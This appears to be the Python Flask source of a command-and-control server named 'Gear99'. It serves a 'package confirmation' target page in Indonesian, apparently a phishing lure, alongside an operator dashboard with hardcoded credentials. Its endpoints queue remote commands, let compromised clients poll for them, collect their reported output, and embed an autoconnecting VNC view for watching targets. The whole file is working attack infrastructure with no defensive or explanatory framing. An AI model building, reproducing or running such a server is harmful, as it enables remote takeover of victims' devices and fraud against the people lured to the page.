from flask import Flask, render_template, request, jsonify, render_template_string
import time

app = Flask(__name__)

USER_CORE = "operator_gear99"
PASS_CORE = "G99_SecureControl_2026!"

current_command = None
latest_logs = ["[SYSTEM] Core Server initialized..."]

@app.route('/')
def index():
    return "Gear99 Core Server Active"

@app.route('/konfirmasi-paket')
def target_page():
    return render_template('target.html')

@app.route('/operator')
def operator_dashboard():
    return render_template('operator.html')

@app.route('/login', methods=['POST'])
def login_operator():
    data = request.json
    if data.get('username') == USER_CORE and data.get('password') == PASS_CORE:
        return jsonify({"status": "authenticated", "token": "TOKEN_GEAR99_CORE_ACTIVE"})
    return jsonify({"status": "denied", "message": "Kredensial Salah!"}), 401

@app.route('/send_command', methods=['POST'])
def send_command():
    global current_command
    data = request.json
    current_command = data.get('command')
    add_log(f"Mengirim perintah ke sistem: [{current_command.upper()}]")
    return jsonify({"status": "queued"})

@app.route('/poll_command', methods=['GET'])
def poll_command():
    global current_command
    if current_command:
        cmd = current_command
        current_command = None
        return jsonify({"command": cmd})
    return jsonify({"command": None})

@app.route('/report_output', methods=['POST'])
def report_output():
    data = request.json
    output_text = data.get('output', '')
    add_log(f"[RESPONSE] {output_text}")
    return jsonify({"status": "logged"})

@app.route('/get_logs', methods=['GET'])
def get_logs():
    return jsonify({"logs": latest_logs})

# 💡 JALUR KHUSUS AMAN: Mengembalikan struktur halaman statis murni untuk bingkai simulator
@app.route('/vnc_mirror')
def vnc_mirror():
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <style>body,html,iframe { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#000; border:none; }</style>
        </head>
        <body>
            <script>
                // Mengarahkan secara dinamis ke IP publik server tanpa merusak enkripsi SSL dasbor utama
                document.write('<iframe src="http://' + window.location.hostname + ':6080/vnc.html?autoconnect=true&resize=scale"></iframe>');
            </script>
        </body>
        </html>
    ''')

def add_log(message):
    timestamp = time.strftime('%H:%M:%S')
    latest_logs.append(f"[{timestamp}] {message}")
    if len(latest_logs) > 50:
        latest_logs.pop(0)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
